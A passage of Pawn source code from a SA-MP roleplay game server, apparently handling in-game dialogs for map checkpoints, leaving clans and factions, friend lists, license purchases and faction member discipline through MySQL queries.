				SetPlayerCheckpoint(playerid,1474.2523,-1771.2463,18.7958,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_SERVER,"I've set up a checkpoint on the map. Please follow it !.");
			}
	    	if(listitem == 1)
			{
				SetPlayerCheckpoint(playerid,2165.3982,-1674.2762,15.0813,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_SERVER,"I've set up a checkpoint on the map. Please follow it !.");
			}
	    	if(listitem == 2)
			{
				SetPlayerCheckpoint(playerid,2122.9814,-1789.0095,13.5547,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_SERVER,"I've set up a checkpoint on the map. Please follow it !.");
			}
	    	if(listitem == 3)
			{
				SetPlayerCheckpoint(playerid,1448.7821,-2286.4836,13.5469,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_SERVER,"I've set up a checkpoint on the map. Please follow it !.");
			}
	    	if(listitem == 4)
			{
				SetPlayerCheckpoint(playerid,911.4478,-1232.7585,16.9852,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_SERVER,"I've set up a checkpoint on the map. Please follow it !.");
			}
	    	if(listitem == 5)
			{
				SetPlayerCheckpoint(playerid,1365.8931,-1289.0779,13.5469,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_SERVER,"I've set up a checkpoint on the map. Please follow it !.");
			}
	    	if(listitem == 6)
			{
				SetPlayerCheckpoint(playerid,2503.0581,2778.7229,10.8203,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_SERVER,"I've set up a checkpoint on the map. Please follow it !.");
			}
	    	if(listitem == 7)
			{
				SetPlayerCheckpoint(playerid,840.9308,-2066.2319,12.8672,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_SERVER,"I've set up a checkpoint on the map. Please follow it !.");
			}
	    	if(listitem == 8)
			{
				SetPlayerCheckpoint(playerid,-77.5034,-1136.4935,1.0781,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_SERVER,"I've set up a checkpoint on the map. Please follow it !.");
			}
	    	if(listitem == 9)
			{
				SetPlayerCheckpoint(playerid,-382.8333,-1426.0831,26.2830,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_SERVER,"I've set up a checkpoint on the map. Please follow it !.");
			}
			if(listitem == 10)
			{
				SetPlayerCheckpoint(playerid,2850.9663,891.8728,10.7500,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_SERVER,"I've set up a checkpoint on the map. Please follow it !.");
			}
			if(listitem == 11)
			{
			    SetPlayerCheckpoint(playerid,1973.3063,-1304.7975,20.8316,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_SERVER,"I've set up a checkpoint on the map. Please follow it !.");
			}
			if(listitem == 12)
			{
			    SetPlayerCheckpoint(playerid,1154.3644,-1181.1787,32.8187,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_SERVER,"I've set up a checkpoint on the map. Please follow it !.");
			}
			if(listitem == 13)
			{
			    SetPlayerCheckpoint(playerid,816.6126,857.0764,12.7891,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_SERVER,"I've set up a checkpoint on the map. Please follow it !.");
			}
			if(listitem == 14)
			{
			    SetPlayerCheckpoint(playerid,1972.4215,-1358.8444,14.1548,4.0);
			    CP[playerid] = 43;
			    SCM(playerid,COLOR_SERVER,"I've set up a checkpoint on the map. Please follow it !.");
			}
		}
		return 1;
	}
	if(dialogid == DIALOG_QUITCLAN)
	{
		if(response)
		{
			new szMessage[256],str1[300];
			if(PlayerInfo[playerid][pCRank] != 7)
			{
				GetPlayerName(playerid,sendername,sizeof(sendername));
				format(szMessage, sizeof(szMessage), "%s has left the clan (quit clan).", sendername);
				SendToClan(PlayerInfo[playerid][pClan], COLOR_YELLOW, szMessage);
				format(szMessage,sizeof(szMessage), "You have left the %s.",ClanInfo[PlayerInfo[playerid][pClan]][cClanName]);
				SendClientMessage(playerid,COLOR_SERVER,szMessage);
				format(string, sizeof(string), "%s", PlayerInfo[playerid][pNormalName]);
				format(str1,sizeof(str1),"{%s}[CLAN] %s left the clan (using /quitclan).", ClanInfo[PlayerInfo[playerid][pClan]][cClanColor], sendername);
				SendToClan(PlayerInfo[playerid][pClan], COLOR_SERVER, str1);
				SetPlayerName(playerid,string);
				PlayerInfo[playerid][pClan] = 0;
				PlayerInfo[playerid][pCRank] = 0;
				PlayerInfo[playerid][pCWarns] = 0;
				mysql_format(SQL, str1, sizeof(str1), "UPDATE users SET `CRank`='0',`Clan`='0',`ClanJoin`='0',`ClanTime`='0',`ClanTag`='0',`ClanWarns`='0' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str1,"","");
				LoadClanInfo();
			}
			else
			{
				new idd,query[256];
				format(query, sizeof(query), "SELECT id FROM `users` WHERE `Clan` = '%d' AND `CRank` < '7'", PlayerInfo[playerid][pClan]);
				new Cache: masta = mysql_query(SQL, query);
				if(cache_get_row_count() >= 1)
				{
					for(new i, j = cache_get_row_count (); i != j; ++i)
					{
						idd = cache_get_field_content_int(i, "id");
						mysql_format(SQL, str1, sizeof(str1), "INSERT INTO `emails` (`playerid`,`Message`) VALUES('%d','Ai fost dat afara din clan deoarece liderul l-a parasit.')",idd);
						mysql_tquery(SQL,str1,"","");
					}
				}
				cache_delete(masta);
				mysql_format(SQL, str1, sizeof(str1), "UPDATE users SET `CRank`='0',`Clan`='0',`ClanJoin`='0',`ClanTime`='0',`ClanTag`='0',`ClanWarns`='0' WHERE `Clan`='%d'",PlayerInfo[playerid][pClan]);
				mysql_tquery(SQL,str1,"","");
				mysql_format(SQL, str1, sizeof(str1), "DELETE FROM `clans` WHERE `clanID`='%d'",PlayerInfo[playerid][pClan]);
				mysql_tquery(SQL,str1,"","");
				foreach(Player, i)
				{
					if(PlayerInfo[i][pClan] == PlayerInfo[playerid][pClan])
					{
						format(string, 256, "%s", PlayerInfo[i][pNormalName]);
						SetPlayerName(i,string);
						PlayerInfo[i][pClan] = 0;
						PlayerInfo[i][pCRank] = 0;
						PlayerInfo[i][pCWarns] = 0;
					}
				}
			}
		}
	}
	if(dialogid == DIALOG_QUITGROUP)
	{
		if(response)
		{
			new query[256];
			if(PlayerInfo[playerid][pMember] > 0 && PlayerInfo[playerid][pLeader] > 0)
			{
 				GetPlayerName(playerid, sendername, sizeof(sendername));
				new string2[500];
    			format(string2, sizeof(string2), "* You have left faction %s (rank %d) after %d days, with 50 FP.", NumeFactiune(PlayerInfo[playerid][pMember]), PlayerInfo[playerid][pRank], PlayerInfo[playerid][pFactionTime]);
				SendClientMessage(playerid, COLOR_YELLOW, string2);
				format(string2, sizeof(string2), "%s left faction %s (rank %d) after %d days using /quitgroup, with 50 FP.", sendername,DynamicFactions[PlayerInfo[playerid][pMember]][fName],PlayerInfo[playerid][pRank],PlayerInfo[playerid][pFactionTime]);
				mysql_format(SQL, query, sizeof(query), "INSERT INTO faction_logs (`text`,`player`,`leader`) VALUES ('%s','%d','0')", string2,PlayerInfo[playerid][pSQLID]);
				mysql_tquery(SQL,query,"","");
				format(string,sizeof(string),"%s left faction %s (rank %d) after %d days using /quitgroup, WITH 50 FP.",sendername,DynamicFactions[PlayerInfo[playerid][pMember]][fName],PlayerInfo[playerid][pRank],PlayerInfo[playerid][pFactionTime]);
				SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GENANNOUNCE, string);
				gTeam[playerid] = 3;
				PlayerInfo[playerid][pTeam] = 3;
				PlayerInfo[playerid][pMember] = 0;
				PlayerInfo[playerid][pRank] = 0;
				PlayerInfo[playerid][pLeader] = 0;
				PlayerInfo[playerid][pFACWarns] = 0;
				PlayerInfo[playerid][pFpunish] = 50;
				PlayerInfo[playerid][pFactionTime] = 0;
				PlayerInfo[playerid][pModel] = 250;
				tazer[playerid] = 0;
				OnDuty[playerid] = 0;
				SetPlayerArmourEx(playerid, 0);
				SetPlayerSkin(playerid,PlayerInfo[playerid][pModel]);
				SpawnPlayer(playerid);
				mysql_format(SQL,query,sizeof(query),"UPDATE users SET `Team`='3',`Member`='0',`Leader`='0',`Rank`='0',`Model`='250',`FPunish`='50',`FWarn`='0', `FactionTime`='0',`FactionJoin`='0' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,query,"","");
			}
			if(PlayerInfo[playerid][pMember] > 0 && PlayerInfo[playerid][pLeader] < 1)
			{
				format(query, 256, "SELECT * FROM `users` WHERE `Member` = '%d' AND `Rank` = '7'", PlayerInfo[playerid][pMember]);
				new Cache: masta = mysql_query(SQL, query);
				if(cache_get_row_count() >= 1)
				{
					GetPlayerName(playerid, sendername, sizeof(sendername));
					new string2[500];
					format(string2, sizeof(string2), "* You have left faction %s (rank %d) after %d days, with 20 FP.", NumeFactiune(PlayerInfo[playerid][pMember]), PlayerInfo[playerid][pRank], PlayerInfo[playerid][pFactionTime]);
					SendClientMessage(playerid, COLOR_YELLOW, string2);
					format(string2, sizeof(string2), "%s left faction %s (rank %d) after %d days using /quitgroup, with 20 FP.", sendername,DynamicFactions[PlayerInfo[playerid][pMember]][fName],PlayerInfo[playerid][pRank],PlayerInfo[playerid][pFactionTime]);
					mysql_format(SQL, query, sizeof(query), "INSERT INTO faction_logs (`text`,`player`,`leader`) VALUES ('%s','%d','0')", string2,PlayerInfo[playerid][pSQLID]);
					mysql_tquery(SQL,query,"","");
					format(string,sizeof(string),"%s left faction %s (rank %d) after %d days using /quitgroup, WITH 20 FP.",sendername,DynamicFactions[PlayerInfo[playerid][pMember]][fName],PlayerInfo[playerid][pRank],PlayerInfo[playerid][pFactionTime]);
					SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GENANNOUNCE, string);
					gTeam[playerid] = 3;
					PlayerInfo[playerid][pTeam] = 3;
					PlayerInfo[playerid][pMember] = 0;
					PlayerInfo[playerid][pRank] = 0;
					PlayerInfo[playerid][pLeader] = 0;
					PlayerInfo[playerid][pFACWarns] = 0;
					PlayerInfo[playerid][pFpunish] = 20;
					PlayerInfo[playerid][pFactionTime] = 0;
					PlayerInfo[playerid][pModel] = 250;
					tazer[playerid] = 0;
					OnDuty[playerid] = 0;
					SetPlayerArmourEx(playerid, 0);
					SetPlayerSkin(playerid,PlayerInfo[playerid][pModel]);
					SpawnPlayer(playerid);
					mysql_format(SQL,query,sizeof(query),"UPDATE users SET `Team`='3',`Member`='0',`Leader`='0',`Rank`='0',`Model`='250',`FPunish`='20',`FWarn`='0', `FactionTime`='0',`FactionJoin`='0' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,query,"","");
				}
				else
				{
					GetPlayerName(playerid, sendername, sizeof(sendername));
					new string2[500];
					format(string2, sizeof(string2), "* You have left faction %s (rank %d) after %d days, without FP. The faction had no leader when you left.", NumeFactiune(PlayerInfo[playerid][pMember]), PlayerInfo[playerid][pRank], PlayerInfo[playerid][pFactionTime]);
					SendClientMessage(playerid, COLOR_YELLOW, string2);
					format(string2, sizeof(string2), "%s left faction %s (rank %d) after %d days using /quitgroup, without FP. The faction had no leader when he/she left.", sendername,DynamicFactions[PlayerInfo[playerid][pMember]][fName],PlayerInfo[playerid][pRank],PlayerInfo[playerid][pFactionTime]);
					mysql_format(SQL, query, sizeof(query), "INSERT INTO faction_logs (`text`,`player`,`leader`) VALUES ('%s','%d','0')", string2,PlayerInfo[playerid][pSQLID]);
					mysql_tquery(SQL,query,"","");
					format(string,sizeof(string),"%s left faction %s (rank %d) after %d days using /quitgroup, without FP.",sendername,DynamicFactions[PlayerInfo[playerid][pMember]][fName],PlayerInfo[playerid][pRank],PlayerInfo[playerid][pFactionTime]);
					SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GENANNOUNCE, string);
					gTeam[playerid] = 3;
					PlayerInfo[playerid][pTeam] = 3;
					PlayerInfo[playerid][pMember] = 0;
					PlayerInfo[playerid][pRank] = 0;
					PlayerInfo[playerid][pLeader] = 0;
					PlayerInfo[playerid][pFACWarns] = 0;
					PlayerInfo[playerid][pFpunish] = 0;
					PlayerInfo[playerid][pFactionTime] = 0;
					PlayerInfo[playerid][pModel] = 250;
					tazer[playerid] = 0;
					OnDuty[playerid] = 0;
					SetPlayerArmourEx(playerid, 0);
					SetPlayerSkin(playerid,PlayerInfo[playerid][pModel]);
					SpawnPlayer(playerid);
					mysql_format(SQL,query,sizeof(query),"UPDATE users SET `Team`='3',`Member`='0',`Leader`='0',`Rank`='0',`Model`='250',`FPunish`='0',`FWarn`='0', `FactionTime`='0',`FactionJoin`='0' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,query,"","");
				}
				cache_delete(masta);
			}
		}
	}
	if(dialogid == DIALOG_FRIENDS)
	{
		if(response)
		{
			if(listitem == 0)
			{
				ShowPlayerDialog(playerid, DIALOG_ADDFRIENDS, DIALOG_STYLE_INPUT, "Add friend", "Type ID of the player you want to add as a friend:", "Add Friend", "Exit");
			}
			if(listitem > 0)
			{
				new query[256],name[30],result[30],idd,status,title[50];
				format(query, sizeof(query), "SELECT name, id, Status FROM `users` WHERE `id`='%d'",Selected[playerid][listitem]);
				new Cache: membresult = mysql_query(SQL,query);
				for(new i, j = cache_get_row_count (); i != j; ++i)
				{
					cache_get_field_content(i, "name", result); format(name, 30, result);
					idd = cache_get_field_content_int(i, "id");
					status = cache_get_field_content_int(i, "Status");
					Selected2[playerid] = idd;
					if(status > 0)
					{
						format(title, sizeof(title), "[online] %s", name);
					}
					else if(status == 0)
					{
						format(title, sizeof(title), "[offline] %s", name);
					}
				}
				cache_delete(membresult);
				ShowPlayerDialog(playerid, DIALOG_FRIENDS2, DIALOG_STYLE_LIST, title, "Remove Friend\nView phone number", "Select", "Exit");
			}
		}
	}
	if(dialogid == DIALOG_FRIENDS2)
	{
		if(response)
		{
			if(listitem == 0)
			{
				new str1[200];
				mysql_format(SQL,str1, sizeof(str1), "DELETE FROM `friends` WHERE `FriendID`='%d'", Selected2[playerid]);
	       		mysql_tquery(SQL,str1,"","");
				SendClientMessage(playerid, COLOR_YELLOW, "Friend removed.");
			}
			if(listitem == 1)
			{
				new phone,query[256],name[30],result[30],strings[128];
				format(query, sizeof(query), "SELECT name, PhoneNr FROM `users` WHERE `id`='%d'",Selected2[playerid]);
				new Cache: membresult = mysql_query(SQL,query);
				for(new i, j = cache_get_row_count (); i != j; ++i)
				{
					phone = cache_get_field_content_int(i, "PhoneNr");
					cache_get_field_content(i, "name", result); format(name, 30, result);
					if(phone != 0)
					{
						format(strings, sizeof(strings), "Name: {CECECE}%s {FFFFFF}| Number: {CECECE}%d",name,phone);
					}
					else
					{
						format(strings, sizeof(strings), "Name: {CECECE}%s {FFFFFF}| Number: {CECECE}None",name,phone);
					}
					SendClientMessage(playerid, COLOR_SERVER, strings);
				}
				cache_delete(membresult);
			}
		}
	}
	if(dialogid == DIALOG_ADDFRIENDS)
	{
		if(response)
		{
		    for(new i; i < sizeof(antisqlinjection); i++)
			{
    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
        		{
	      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
      				return 1;
		        }
			}
			new text[50];
			mysql_real_escape_string(inputtext, text);
			if(IsNumeric(text))
			{
				new str1[256],id = strval(text);
				if(id == playerid) return SendClientMessage(playerid, COLOR_SERVER, "Nu te poti adauga singur in lista de prieteni.");
				format(str1, sizeof(str1), "SELECT * FROM `friends` WHERE `FriendID`='%d' AND `PlayerID`='%d'",PlayerInfo[id][pSQLID],PlayerInfo[playerid][pSQLID]);
				new Cache: membresult = mysql_query(SQL,str1);
				if(cache_get_row_count () > 0)
				{
					SendClientMessage(playerid, COLOR_SERVER, "That player is already in your list of friends.");
					return 1;
				}
				cache_delete(membresult);
				mysql_format(SQL, str1, sizeof(str1), "INSERT INTO `friends` (`PlayerID`,`FriendID`,`FriendName`) VALUES('%d','%d','%s')",PlayerInfo[playerid][pSQLID],PlayerInfo[id][pSQLID],PlayerInfo[id][pNormalName]);
				mysql_tquery(SQL,str1,"","");
				SendClientMessage(playerid, COLOR_YELLOW, "Friend added!");
			}
			else if(!IsNumeric(text))
			{
				new find = 0;
				foreach(Player, i)
				{
					if(IsPlayerConnected(i))
					{
						if(find == 0)
						{
							new name[30],str1[256];
							GetPlayerName(i, name, sizeof(name));
							if(strfind(name, text) != -1)
							{
								find = 1;
								if(i == playerid) return SendClientMessage(playerid, COLOR_SERVER, "Nu te poti adauga singur in lista de prieteni.");
								format(str1, sizeof(str1), "SELECT * FROM `friends` WHERE `FriendID`='%d' AND `PlayerID`='%d'",PlayerInfo[i][pSQLID],PlayerInfo[playerid][pSQLID]);
								new Cache: membresult = mysql_query(SQL,str1);
								if(cache_get_row_count () > 0)
								{
									SendClientMessage(playerid, COLOR_SERVER, "That player is already in your list of friends.");
									return 1;
								}
								cache_delete(membresult);
								mysql_format(SQL, str1, sizeof(str1), "INSERT INTO `friends` (`PlayerID`,`FriendID`,`FriendName`) VALUES('%d','%d','%s')",PlayerInfo[playerid][pSQLID],PlayerInfo[i][pSQLID],PlayerInfo[i][pNormalName]);
								mysql_tquery(SQL,str1,"","");
								SendClientMessage(playerid, COLOR_YELLOW, "Friend addedt!");
							}
						}
					}
					else return SendClientMessage(playerid, COLOR_SERVER, "ID invalid. You can add only players with'm online list of friends.");
				}
				if(find == 0)
				{
					SendClientMessage(playerid, COLOR_SERVER, "ID invalid. You can add only players with'm online list of friends.");
				}
			}
		}
	}
	if(dialogid == Dialog_shoplicense)
	{
	    if(response)
	    {
			if(listitem == 0)
			{
			    if(PlayerInfo[playerid][pCarLic] == 0)
			    {
					PlayerInfo[playerid][pCarLic] = 1;
			        PlayerInfo[playerid][pCarLicT] = 100;
					new str[128];
					mysql_format(SQL,str,128,"UPDATE users SET `CarLic`='1',`CarLicT`='100' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,str,"","");
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Congratulations, you got Driving license for 100 hours [/licenses]");
				}
			    else return SendClientMessage(playerid, COLOR_ERROR, "It did not yet expired license Driving!");
            }
			if(listitem == 1)
			{
			    if(PlayerInfo[playerid][pFlyLic] == 0)
			    {
					PlayerInfo[playerid][pFlyLic] = 1;
			        PlayerInfo[playerid][pFlyLicT] = 100;
					new str[128];
					mysql_format(SQL,str,128,"UPDATE users SET `FlyLic`='1',`FlyLicT`='100' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,str,"","");
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Congratulations, you got licensed Pilots for 100 hours [/licenses]");
				}
		        else return SendClientMessage(playerid, COLOR_ERROR, "It did not yet expired license Pilots!");
            }
			if(listitem == 2)
			{
			    if(PlayerInfo[playerid][pBoatLic] == 0)
			    {
	                PlayerInfo[playerid][pBoatLic] = 1;
			        PlayerInfo[playerid][pBoatLicT] = 100;
					new str[128];
					mysql_format(SQL,str,128,"UPDATE users SET `BoatLic`='1',`BoatLicT`='100' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,str,"","");
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Congratulations, you got license Boats for 100 hours [/licenses]");
				}
			    else return SendClientMessage(playerid, COLOR_ERROR, "It did not yet expired Boat license!");
            }
			if(listitem == 3)
			{
			    if(PlayerInfo[playerid][pGunLic] == 0)
			    {
	                PlayerInfo[playerid][pGunLic] = 1;
			        PlayerInfo[playerid][pGunLicT] = 100;
					new str[128];
					mysql_format(SQL,str,128,"UPDATE users SET `GunLic`='1',`GunLicT`='100' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,str,"","");
					SendClientMessage(playerid, COLOR_LIGHTBLUE, "Congratulations, you got Weapon license for 100 hours [/licenses]");
				}
			    else return SendClientMessage(playerid, COLOR_ERROR, "It did not yet expired license Weapon!");
            }
		}
		return 1;
	}
	if(dialogid == DIALOG_MEMBERS)
	{
		if(response)
		{
			if(listitem >= 0)
			{
				if(PlayerInfo[playerid][pRank] >= 6)
				{
					new name[30],result[30],query[300],test[5],strings[300];
					format(query, sizeof(query), "SELECT * FROM `users` WHERE `id`='%d'",Selected[playerid][listitem]);
					new Cache: membresult = mysql_query(SQL,query);
					for(new i, j = cache_get_row_count (); i != j; ++i)
					{
						cache_get_field_content(i, "name", result); format(name, 30, result);
						cache_get_field_content(i, "Rank", result); format(test, 5, result);
					}
					cache_delete(membresult);
					Selected2[playerid] = Selected[playerid][listitem];
					format(strings, sizeof(strings),"%s - %s",test,name);
					ShowPlayerDialog(playerid, DIALOG_MEMBERS2, DIALOG_STYLE_LIST, strings, "Change Rank\nFaction Warn\nClear FW\nUninvite - 20 FP\nUninvite - 0 FP", "OK", "Exit");
				}
			}
		}
	}
	if(dialogid == DIALOG_MEMBERS2)
	{
		if(response)
		{
			if(listitem == 0)
			{
				SendClientMessage(playerid, COLOR_SERVER, "Usage: /changerank <id> <rank>");
			}
			if(listitem == 1)
			{
				new string1[256],rank;
				if(PlayerInfo[playerid][pSQLID] == Selected2[playerid]) return SendClientMessage(playerid, COLOR_SERVER, "You can not give yourself FW.");
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(PlayerInfo[i][pSQLID] == Selected2[playerid])
					{
						if(PlayerInfo[playerid][pRank] == 6 && PlayerInfo[i][pRank] == 7 || PlayerInfo[playerid][pRank] == 6 && PlayerInfo[i][pRank] == 6) return SendClientMessage(playerid, COLOR_SERVER, "Nu-i poti da FW unui membru de rank 6-7.");
					}
				}
				format(string1, sizeof(string1), "SELECT * FROM `users` WHERE `id`='%d'",Selected2[playerid]);
				new Cache: membresult = mysql_query(SQL,string1);
				for(new i, j = cache_get_row_count (); i != j; ++i)
				{
					rank = cache_get_field_content_int(i, "Rank");
				}
				cache_delete(membresult);
				if(PlayerInfo[playerid][pRank] == 6 && rank == 6 || PlayerInfo[playerid][pRank] == 6 && rank == 7) return SendClientMessage(playerid, COLOR_SERVER, "FW can not give a member of rank 6-7.");
				ShowPlayerDialog(playerid, DIALOG_FWARN, DIALOG_STYLE_MSGBOX, "Are you sure?", "Are you sure you want to give that member FW?", "Yes", "No");
			}
			if(listitem == 2)
			{
				new string1[256],rank;
				if(PlayerInfo[playerid][pSQLID] == Selected2[playerid]) return SendClientMessage(playerid, COLOR_SERVER, "You can not give one clear FW.");
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(PlayerInfo[i][pSQLID] == Selected2[playerid])
					{
						if(PlayerInfo[playerid][pRank] == 6 && PlayerInfo[i][pRank] == 7 || PlayerInfo[playerid][pRank] == 6 && PlayerInfo[i][pRank] == 6) return SendClientMessage(playerid, COLOR_SERVER, "You can not give a clear FW Member rank 6-7.");
					}
				}
				format(string1, sizeof(string1), "SELECT * FROM `users` WHERE `id`='%d'",Selected2[playerid]);
				new Cache: membresult = mysql_query(SQL,string1);
				for(new i, j = cache_get_row_count (); i != j; ++i)
				{
					rank = cache_get_field_content_int(i, "Rank");
				}
				cache_delete(membresult);
				if(PlayerInfo[playerid][pRank] == 6 && rank == 6 || PlayerInfo[playerid][pRank] == 6 && rank == 7) return SendClientMessage(playerid, COLOR_SERVER, "You can not give a clear FW Member rank 6-7.");
				ShowPlayerDialog(playerid, DIALOG_FUNWARN, DIALOG_STYLE_MSGBOX, "Are You Sure?", "Are you sure you want to delete the FW that member?", "Yes", "No");
			}
			if(listitem == 3)
			{
				if(PlayerInfo[playerid][pSQLID] == Selected2[playerid]) return SendClientMessage(playerid, COLOR_SERVER, "You can not give yourself uninvite.");
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(PlayerInfo[i][pSQLID] == Selected2[playerid])
					{
						if(PlayerInfo[playerid][pRank] == 6 && PlayerInfo[i][pRank] == 7 || PlayerInfo[playerid][pRank] == 6 && PlayerInfo[i][pRank] == 6) return SendClientMessage(playerid, COLOR_SERVER, "You can not give uninvite a member of rank 6-7.");
					}
				}
				new stringtotal[500],string1[256],ftime,result[30],name[30],rank;
				format(string1, sizeof(string1), "SELECT * FROM `users` WHERE `id`='%d'",Selected2[playerid]);
				new Cache: membresult = mysql_query(SQL,string1);
				for(new i, j = cache_get_row_count (); i != j; ++i)
				{
					ftime = cache_get_field_content_int(i, "FactionTime");
					cache_get_field_content(i, "name", result); format(name, 30, result);
					rank = cache_get_field_content_int(i, "Rank");
				}
				cache_delete(membresult);
				if(PlayerInfo[playerid][pRank] == 6 && rank == 6 || PlayerInfo[playerid][pRank] == 6 && rank == 7) return SendClientMessage(playerid, COLOR_SERVER, "You can not give uninvite a member of rank 6-7.");
				format(string1, sizeof(string1),"You're about to give him his uninvite %s 20 FP.\nThis faction is %d days.\nWrite uninvite why below:",name,ftime);
				format(stringtotal, sizeof(stringtotal),"Careful!!! Playerii having over 14 days will give out without FP, unless it breaks the rules faction.\n%s",string1);
				ShowPlayerDialog(playerid, DIALOG_FPUNINVITE, DIALOG_STYLE_INPUT, "Uninvite - 20 FP", stringtotal, "Uninvite", "Exit");
			}
			if(listitem == 4)
			{
				if(PlayerInfo[playerid][pSQLID] == Selected2[playerid]) return SendClientMessage(playerid, COLOR_SERVER, "You can not give yourself uninvite.");
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(PlayerInfo[i][pSQLID] == Selected2[playerid])
					{
						if(PlayerInfo[playerid][pRank] == 6 && PlayerInfo[i][pRank] == 7 || PlayerInfo[playerid][pRank] == 6 && PlayerInfo[i][pRank] == 6) return SendClientMessage(playerid, COLOR_SERVER, "You can not give uninvite a member of rank 6-7.");
					}
				}
				new stringtotal[500],string1[256],ftime,result[30],name[30],rank;
				format(string1, sizeof(string1), "SELECT * FROM `users` WHERE `id`='%d'",Selected2[playerid]);
				new Cache: membresult = mysql_query(SQL,string1);
				for(new i, j = cache_get_row_count (); i != j; ++i)
				{
					ftime = cache_get_field_content_int(i, "FactionTime");
					cache_get_field_content(i, "name", result); format(name, 30, result);
					rank = cache_get_field_content_int(i, "Rank");
				}
				cache_delete(membresult);
				if(PlayerInfo[playerid][pRank] == 6 && rank == 6 || PlayerInfo[playerid][pRank] == 6 && rank == 7) return SendClientMessage(playerid, COLOR_SERVER, "You can not give uninvite a member of rank 6-7.");
				format(string1, sizeof(string1),"You're about to give uninvite %s WITHOUT FP. \nThis is %d days faction. \nScrie uninvite why below:",name,ftime);
				format(stringtotal, sizeof(stringtotal),"Careful!!! Playerii they are under 14 days in faction will give out with FP, unless an owner tells you it's okay to give uninvite without FP. \n%s",string1);
				ShowPlayerDialog(playerid, DIALOG_NOUNINVITE, DIALOG_STYLE_INPUT, "Uninvite - 0 FP", stringtotal, "Uninvite", "Exit");
			}
		}
	}
	if(dialogid == DIALOG_FPUNINVITE)
	{
		if(response)
		{
		    for(new i; i < sizeof(antisqlinjection); i++)
			{
    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
        		{
	      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
      				return 1;
		        }
			}
			new string1[300],result[30],name[30],rank,ftime,reason[128],idd;
			format(string1, sizeof(string1), "SELECT * FROM `users` WHERE `id`='%d'",Selected2[playerid]);
			new Cache: membresult = mysql_query(SQL,string1);
			for(new i, j = cache_get_row_count (); i != j; ++i)
			{
				cache_get_field_content(i, "name", result); format(name, 30, result);
				ftime = cache_get_field_content_int(i, "FactionTime");
				rank = cache_get_field_content_int(i, "Rank");
				idd = cache_get_field_content_int(i, "id");
			}
			cache_delete(membresult);
			mysql_real_escape_string(inputtext, reason);
			new string2[500],query[500];
			format(string2, sizeof(string2), "%s was uninvited by %s from faction %s (rank %d) after %d days, with FP. Reason: %s.", name,PlayerInfo[playerid][pNormalName],DynamicFactions[PlayerInfo[playerid][pMember]][fName],rank,ftime,reason);
			mysql_format(SQL, query, sizeof(query), "INSERT INTO faction_logs (`text`,`player`,`leader`) VALUES ('%s','%d','%d')", string2, idd, PlayerInfo[playerid][pSQLID]);
			mysql_tquery(SQL,query,"","");
			mysql_format(SQL,string1,sizeof(string1),"UPDATE users SET `Team`='3',`Member`='0',`Leader`='0',`Rank`='0',`Model`='250',`FPunish`='20',`FWarn`='0',`FactionTime`='0',`FactionJoin`='0' WHERE `id`='%d'",Selected2[playerid]);
			mysql_tquery(SQL,string1,"","");
			foreach(Player, i)
			{
				if(PlayerInfo[i][pSQLID] == Selected2[playerid])
				{
					gTeam[i] = 3;
					PlayerInfo[i][pTeam] = 3;
					PlayerInfo[i][pMember] = 0;
					PlayerInfo[i][pRank] = 0;
      				PlayerInfo[i][pLeader] = 0;
					PlayerInfo[i][pFACWarns] = 0;
					PlayerInfo[i][pFpunish] = 20;
					PlayerInfo[i][pFactionTime] = 0;
					PlayerInfo[i][pModel] = 250;
					SetPlayerArmourEx(i, 0);
					tazer[i] = 0;
					OnDuty[i] = 0;
					SetPlayerSkin(i,PlayerInfo[i][pModel]);
					SpawnPlayer(i);
				}
			}
			format(string1, sizeof(string1),"%s was uninvited by %s from faction %s (rank %d) after %d days, with FP. Reason: %s",name,PlayerInfo[playerid][pNormalName],DynamicFactions[PlayerInfo[playerid][pMember]][fName],rank,ftime,reason);
            Factionlog(PlayerInfo[playerid][pMember],idd,PlayerInfo[playerid][pSQLID],string1);
			SendFamilyMessage(PlayerInfo[playerid][pMember], COLOR_GENANNOUNCE, string1);
		}
		return 1;
	}
	if(dialogid == DIALOG_NOUNINVITE)
	{
		if(response)
		{
		    for(new i; i < sizeof(antisqlinjection); i++)
			{
    			if(strfind(inputtext, antisqlinjection[i], true) != -1)
        		{
	      			SCM(playerid, COLOR_ERROR, "There are also characters permitted.");
      				return 1;
		        }
			}
